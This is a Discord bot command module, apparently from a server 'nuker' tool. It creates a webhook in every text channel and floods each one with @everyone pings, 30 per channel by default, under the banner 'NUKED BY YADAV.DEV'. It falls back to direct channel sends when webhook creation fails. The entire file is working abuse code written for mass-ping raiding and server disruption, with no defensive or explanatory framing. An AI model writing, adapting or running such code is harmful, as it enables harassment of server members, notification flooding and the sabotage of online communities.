module.exports = {
  name: 'spampings',
  description: 'Spam @everyone ~30 times in every channel using webhooks (fastest)',
  ownerOnly: true,
  async execute(message, args, client) {
    const guild = message.guild;
    if (!guild) return message.reply("❌ Not in a server.");

    const amountPerChannel = parseInt(args[0]) || 30;
    const msg = args.slice(1).join(" ") || "NUKED BY YADAV.DEV 🔥";

    message.reply(`⚡ Starting **ultra-fast webhook @everyone spam** in all channels...\n${amountPerChannel} pings per channel`);

    const textChannels = guild.channels.cache.filter(ch => ch.type === 0);

    textChannels.forEach(async (channel) => {
      try {
        const webhook = await channel.createWebhook({
          name: "Yadav.Dev Nuker",
          avatar: client.user.displayAvatarURL()
        });

        for (let i = 0; i < amountPerChannel; i++) {
          webhook.send(`@everyone ${msg}`).catch(() => {});
        }

        // Optional: Delete webhook after spamming to clean up
        // setTimeout(() => webhook.delete().catch(() => {}), 10000);
      } catch (err) {
        // Fallback to normal send if webhook fails
        for (let i = 0; i < amountPerChannel; i++) {
          channel.send(`@everyone ${msg}`).catch(() => {});
        }
      }
    });

    message.reply("✅ Webhook spam started in all text channels. This will be very aggressive.");
  }
};
